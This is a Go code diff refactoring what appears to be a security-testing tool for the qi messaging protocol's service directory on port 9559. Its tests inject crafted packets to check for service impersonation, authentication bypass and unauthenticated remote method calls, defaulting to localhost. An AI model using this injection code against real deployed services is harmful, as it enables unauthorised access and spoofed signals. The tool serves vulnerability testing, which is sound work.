@@ -13,7 +13,7 @@ import (
 	"time"
 )
 
-var CheckAddr *string
+var DirectoryAddr *string
 var VictimAddr *string
 
 func messageCallMachineID() net.Message {
@@ -55,7 +55,7 @@ func listenReply(endpoint net.EndPoint, done chan int) {
 	endpoint.AddHandler(filter, consumer, closer)
 }
 
-func listenServiceAddedSignal(addr string, done chan int) {
+func listenServiceAddedSignal(addr string, done chan int, tag string) chan int {
 	sess, err := session.NewSession(addr)
 	if err != nil {
 		log.Fatalf("failed to connect: %s", err)
@@ -73,17 +73,20 @@ func listenServiceAddedSignal(addr string, done chan int) {
 		log.Fatalf("failed to get remote signal channel: %s", err)
 	}
 
-	for e := range channel {
-		if e.P1 == "foobar" {
-			log.Printf("success: foobar was emited")
-			done <- 1
-			return
+	go func() {
+		for e := range channel {
+			if e.P1 == tag {
+				log.Printf("%s was emited", tag)
+				done <- 1
+				return
+			}
+			log.Printf("service added: %s (%d) - %s", e.P1, e.P0, tag)
 		}
-		log.Printf("service added: %s (%d)", e.P1, e.P0)
-	}
+	}()
+	return cancel
 }
 
-func messagePostServiceAdded() net.Message {
+func messagePostServiceAdded(tag string) net.Message {
 	serviceID := uint32(1) // serviceDirectory
 	objectID := uint32(1)
 	actionID := uint32(106) // serviceAdded
@@ -92,13 +95,13 @@ func messagePostServiceAdded() net.Message {
 	header := net.NewHeader(net.Post, serviceID, objectID, actionID, id)
 	buf := bytes.NewBuffer(make([]byte, 0))
 	basic.WriteUint32(888, buf)
-	basic.WriteString("foobar", buf)
+	basic.WriteString(tag, buf)
 	return net.NewMessage(header, buf.Bytes())
 }
 
-func postMessages() []net.Message {
+func postMessages(tag string) []net.Message {
 	return []net.Message{
-		messagePostServiceAdded(),
+		messagePostServiceAdded(tag),
 	}
 }
 
@@ -130,9 +133,10 @@ func connect(addr string, doesAuth bool) net.EndPoint {
 
 // test 0: verify call works as intented
 func test0() {
+	log.Printf("test0: verify call works as intented")
 	done := make(chan int)
 	wait := time.After(time.Second * 5)
-	endpoint := connect(*VictimAddr, true)
+	endpoint := connect(*DirectoryAddr, true)
 	go listenReply(endpoint, done)
 
 	err := inject(endpoint, callMessages())
@@ -141,29 +145,35 @@ func test0() {
 	}
 	select {
 	case _ = <-done:
+		log.Printf("success")
 	case _ = <-wait:
+		log.Printf("timeout")
 	}
 }
 
-// test 1: post a signal directly to the targeted service
+// test 1: post a signal directly to a service
 //	1. connect to service
 //	2. authenticate
 //	3. post a signal to the service
 //	=> can impersonate a service
 func test1() {
+	log.Printf("test 1: post a signal to the service")
 	done := make(chan int)
 	wait := time.After(time.Second * 5)
-	go listenServiceAddedSignal(*VictimAddr, done)
+	cancel := listenServiceAddedSignal(*DirectoryAddr, done, "foobar")
 
-	endpoint := connect(*VictimAddr, true)
-	err := inject(endpoint, postMessages())
+	endpoint := connect(*DirectoryAddr, true)
+	err := inject(endpoint, postMessages("foobar"))
 	if err != nil {
 		log.Fatalf("%s", err)
 	}
 	select {
 	case _ = <-done:
+		log.Printf("success")
 	case _ = <-wait:
+		log.Printf("timeout")
 	}
+	cancel <- 1
 }
 
 // test 2: post a signal directly to the targeted service
@@ -171,19 +181,23 @@ func test1() {
 //	2. post a signal to the service
 //	=> can by-pass authentication
 func test2() {
+	log.Printf("test2: post a signal to the service without authentication")
 	done := make(chan int)
 	wait := time.After(time.Second * 5)
-	go listenServiceAddedSignal(*VictimAddr, done)
+	cancel := listenServiceAddedSignal(*DirectoryAddr, done, "eggspam")
 
-	endpoint := connect(*VictimAddr, false)
-	err := inject(endpoint, postMessages())
+	endpoint := connect(*DirectoryAddr, false)
+	err := inject(endpoint, postMessages("eggspam"))
 	if err != nil {
 		log.Fatalf("%s", err)
 	}
 	select {
 	case _ = <-done:
+		log.Printf("success")
 	case _ = <-wait:
+		log.Printf("timeout")
 	}
+	cancel <- 1
 }
 
 // test 3: post a signal directly to the targeted service
@@ -192,19 +206,23 @@ func test2() {
 //	3. post a signal to another service
 // 	=> can by-pass authentication
 func test3() {
+	log.Printf("test3: post a signal to a remote service")
 	done := make(chan int)
 	wait := time.After(time.Second * 5)
-	go listenServiceAddedSignal(*CheckAddr, done)
+	cancel := listenServiceAddedSignal(*DirectoryAddr, done, "bazzfazz")
 
 	endpoint := connect(*VictimAddr, true)
-	err := inject(endpoint, postMessages())
+	err := inject(endpoint, postMessages("bazzfazz"))
 	if err != nil {
 		log.Fatalf("%s", err)
 	}
 	select {
 	case _ = <-done:
+		log.Printf("success")
 	case _ = <-wait:
+		log.Printf("timeout")
 	}
+	cancel <- 1
 }
 
 // test 4: call a method directly to the targeted service
@@ -212,9 +230,10 @@ func test3() {
 //	2. call a method of the service
 //	=> can by-pass authentication
 func test4() {
+	log.Printf("test4: call a method without authentication")
 	done := make(chan int)
 	wait := time.After(time.Second * 5)
-	endpoint := connect(*VictimAddr, false)
+	endpoint := connect(*DirectoryAddr, false)
 	go listenReply(endpoint, done)
 
 	err := inject(endpoint, callMessages())
@@ -223,7 +242,9 @@ func test4() {
 	}
 	select {
 	case _ = <-done:
+		log.Printf("success")
 	case _ = <-wait:
+		log.Printf("timeout")
 	}
 }
 
@@ -233,27 +254,30 @@ func test4() {
 //	2. call a method of another service
 //	=> can by-pass authentication
 func test5() {
+	log.Printf("test5: call a method to a remote object")
 	done := make(chan int)
 	wait := time.After(time.Second * 5)
-	go listenReply(connect(*VictimAddr, true), done)
-
 	endpoint := connect(*VictimAddr, true)
+	go listenReply(endpoint, done)
+
 	err := inject(endpoint, callMessages())
 	if err != nil {
 		log.Fatalf("%s", err)
 	}
 	select {
 	case _ = <-done:
+		log.Printf("success")
 	case _ = <-wait:
+		log.Printf("timeout")
 	}
 }
 
 func main() {
 
 	VictimAddr = flag.String("qi-url-victim",
-		"tcp://127.0.0.1:9559", "where to inject packets")
-	CheckAddr = flag.String("qi-url-check",
-		"tcp://127.0.0.1:9559", "where to check the result")
+		"tcp://127.0.0.1:9559", "open service to inject packets")
+	DirectoryAddr = flag.String("qi-url-directory",
+		"tcp://127.0.0.1:9559", "service directory url")
 	flag.Parse()
 
 	test0()
